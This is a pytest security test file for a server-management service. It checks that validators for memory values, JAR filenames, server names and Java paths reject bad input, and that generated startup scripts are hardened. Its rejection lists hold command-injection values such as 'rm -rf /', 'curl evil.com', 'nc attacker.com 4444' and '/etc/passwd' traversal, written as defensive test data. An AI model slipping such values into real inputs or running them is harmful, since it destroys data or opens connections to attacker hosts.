"""Security tests for command-injection defences.

Split from `tests/test_security.py` (Issue #170) — covers
`ServerSecurityValidator` validators (memory, JAR filename, server name,
java path), shell sanitisation, and startup-script generation guarantees.
"""

import shlex
import stat
import tempfile
from pathlib import Path
from unittest.mock import Mock

import pytest

from app.core.exceptions import InvalidRequestException
from app.servers.application.service import (
    ServerFileSystemService,
    ServerSecurityValidator,
)
from app.servers.models import Server


class TestCommandInjectionSecurity:
    """Test command injection security fixes."""

    def test_memory_value_validation_valid_values(self):
        """Test that valid memory values pass validation."""
        valid_values = [512, 1024, 2048, 4096, 8192, 16384]

        for value in valid_values:
            # Should not raise exception
            assert ServerSecurityValidator.validate_memory_value(value) is True

    def test_memory_value_validation_invalid_values(self):
        """Test that invalid memory values are rejected."""
        invalid_values = [
            -1,  # Negative
            0,  # Zero
            33000,  # Too large
            "512",  # String instead of int
            512.5,  # Float
            None,  # None
        ]

        for value in invalid_values:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_memory_value(value)

    def test_jar_filename_validation_valid_names(self):
        """Test that valid JAR filenames pass validation."""
        valid_names = [
            "server.jar",
            "minecraft-server.jar",
            "paper-1.20.1.jar",
            "spigot_1.19.4.jar",
            "fabric-server-mc.1.20.2.jar",
        ]

        for name in valid_names:
            # Should not raise exception
            assert ServerSecurityValidator.validate_jar_filename(name) is True

    def test_jar_filename_validation_invalid_names(self):
        """Test that invalid JAR filenames are rejected."""
        invalid_names = [
            "",  # Empty
            "server.txt",  # Wrong extension
            "server",  # No extension
            "../server.jar",  # Path traversal
            "server/nested.jar",  # Path separator
            "server\\windows.jar",  # Windows path separator
            "server.jar; rm -rf /",  # Command injection
            "server.jar && curl evil.com",  # Command injection
            "$(rm -rf /).jar",  # Command injection
            "`wget evil.com`.jar",  # Command injection
            "a" * 300 + ".jar",  # Too long
        ]

        for name in invalid_names:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_jar_filename(name)

    def test_server_name_validation_valid_names(self):
        """Test that valid server names pass validation."""
        valid_names = [
            "test-server",
            "my_server",
            "Server 123",
            "My-Server_With.Spaces",
            "simple",
            "Test Server Name",
        ]

        for name in valid_names:
            # Should not raise exception
            assert ServerSecurityValidator.validate_server_name(name) is True

    def test_server_name_validation_invalid_names(self):
        """Test that invalid server names are rejected."""
        invalid_names = [
            "",  # Empty
            "   ",  # Only spaces
            "server; rm -rf /",  # Command injection
            "server && curl evil.com",  # Command injection
            "server | nc attacker.com 4444",  # Command injection
            "server`wget evil.com`",  # Command injection
            "$(rm -rf /tmp)",  # Command injection
            "server/../../../etc/passwd",  # Path traversal
            "server@domain.com",  # Invalid characters
            "server#hash",  # Invalid characters
            "server$variable",  # Invalid characters
            "server%percent",  # Invalid characters
            "server&ampersand",  # Invalid characters
            "server*glob",  # Invalid characters
            "server(parentheses)",  # Invalid characters
            "server[brackets]",  # Invalid characters
            "server{braces}",  # Invalid characters
            "server|pipe",  # Invalid characters
            "server;semicolon",  # Invalid characters
            "server:colon",  # Invalid characters
            "server'quote",  # Invalid characters
            'server"doublequote',  # Invalid characters
            "server<redirect>",  # Invalid characters
            "server?question",  # Invalid characters
            "server+plus",  # Invalid characters
            "server=equals",  # Invalid characters
            "a" * 150,  # Too long
        ]

        for name in invalid_names:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_server_name(name)

    def test_java_path_validation_valid_paths(self):
        """Test that valid Java paths pass validation."""
        valid_paths = [
            "/usr/bin/java",
            "/opt/java/bin/java",
            "/usr/lib/jvm/java-17-openjdk/bin/java",
            "/home/user/java/bin/java",
        ]

        for path in valid_paths:
            # Should not raise exception
            assert ServerSecurityValidator.validate_java_path(path) is True

    def test_java_path_validation_invalid_paths(self):
        """Test that invalid Java paths are rejected."""
        invalid_paths = [
            "",  # Empty
            "java",  # Relative path
            "/usr/bin/java; rm -rf /",  # Command injection
            "/usr/bin/java && curl evil.com",  # Command injection
            "/usr/bin/java | nc attacker.com",  # Command injection
            "/usr/bin/../../../etc/passwd",  # Path traversal
            "/usr/bin/java`wget evil.com`",  # Command injection
            "$(rm -rf /tmp)/java",  # Command injection
            "/usr/bin/java@domain",  # Invalid characters
            "/usr/bin/java#comment",  # Invalid characters
            "/usr/bin/java$variable",  # Invalid characters
            "a" * 600,  # Too long
        ]

        for path in invalid_paths:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_java_path(path)

    def test_shell_sanitization(self):
        """Test shell sanitization function."""
        test_cases = [
            "simple",
            "with spaces",
            "with'quote",
            "with$variable",
            "with;command",
            "with&&command",
            "with|pipe",
            "with`backtick`",
        ]

        for input_val in test_cases:
            result = ServerSecurityValidator.sanitize_for_shell(input_val)
            expected = shlex.quote(input_val)
            assert result == expected, (
                f"Input: {input_val}, Expected: {expected}, Got: {result}"
            )

    @pytest.mark.asyncio
    async def test_startup_script_generation_command_injection_protection(self):
        """Test that startup script generation prevents command injection."""
        with tempfile.TemporaryDirectory() as temp_dir:
            server_dir = Path(temp_dir)

            # Create mock server with malicious values
            malicious_server = Mock(spec=Server)
            malicious_server.id = 1
            malicious_server.max_memory = 1024  # Valid value

            filesystem_service = ServerFileSystemService()

            # This should not raise an exception and should create a secure script
            await filesystem_service._generate_startup_script(
                malicious_server, server_dir
            )

            # Verify script was created
            script_file = server_dir / "start.sh"
            assert script_file.exists()

            # Read script content and verify it's safe
            script_content = script_file.read_text()

            # Verify script uses proper variable quoting
            assert "SERVER_DIR=" in script_content
            assert "MAX_MEMORY=" in script_content
            assert "set -e" in script_content  # Exit on error
            assert "set -u" in script_content  # Exit on undefined variable
            assert "exec java" in script_content  # Uses exec for proper process handling

    def test_command_injection_integration_server_creation(self):
        """Test command injection protection in server creation flow."""
        # Test malicious server names that should be rejected
        malicious_names = [
            "server; rm -rf /",
            "server && curl evil.com",
            "server | nc attacker.com 4444",
            "server`wget evil.com`",
            "$(rm -rf /tmp)",
        ]

        # All malicious names should fail server name validation
        for name in malicious_names:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_server_name(name)

        # Test malicious memory values should be rejected
        malicious_memory_values = [
            -1,  # Negative
            0,  # Zero
            50000,  # Too large
        ]

        for memory in malicious_memory_values:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_memory_value(memory)

        # This demonstrates defense in depth - multiple validation layers

    def test_security_validator_edge_cases(self):
        """Test edge cases in security validation."""
        # Test None values
        with pytest.raises(InvalidRequestException):
            ServerSecurityValidator.validate_server_name(None)

        # Test boundary values for memory
        ServerSecurityValidator.validate_memory_value(1)  # Minimum allowed
        ServerSecurityValidator.validate_memory_value(32768)  # Maximum allowed

        with pytest.raises(InvalidRequestException):
            ServerSecurityValidator.validate_memory_value(0)  # Below minimum

        with pytest.raises(InvalidRequestException):
            ServerSecurityValidator.validate_memory_value(32769)  # Above maximum

    @pytest.mark.asyncio
    async def test_startup_script_security_features(self):
        """Test that generated startup scripts have security features."""
        with tempfile.TemporaryDirectory() as temp_dir:
            server_dir = Path(temp_dir)

            # Create valid server mock
            server = Mock(spec=Server)
            server.id = 1
            server.max_memory = 2048

            filesystem_service = ServerFileSystemService()

            # Generate startup script
            await filesystem_service._generate_startup_script(server, server_dir)

            script_file = server_dir / "start.sh"
            script_content = script_file.read_text()

            # Verify security features
            security_checks = [
                "set -e",  # Exit on error
                "set -u",  # Exit on undefined variable
                "SERVER_DIR=",  # Proper variable assignment
                'if [ ! -d "$SERVER_DIR" ]',  # Directory validation
                'if [ ! -f "$SERVER_DIR/$JAR_FILE" ]',  # File validation
                "exec java",  # Proper process execution
            ]

            for check in security_checks:
                assert check in script_content, f"Missing security feature: {check}"

            # Verify file permissions (should be executable)
            file_stat = script_file.stat()
            assert file_stat.st_mode & stat.S_IRUSR  # Owner read
            assert file_stat.st_mode & stat.S_IWUSR  # Owner write
            assert file_stat.st_mode & stat.S_IXUSR  # Owner execute
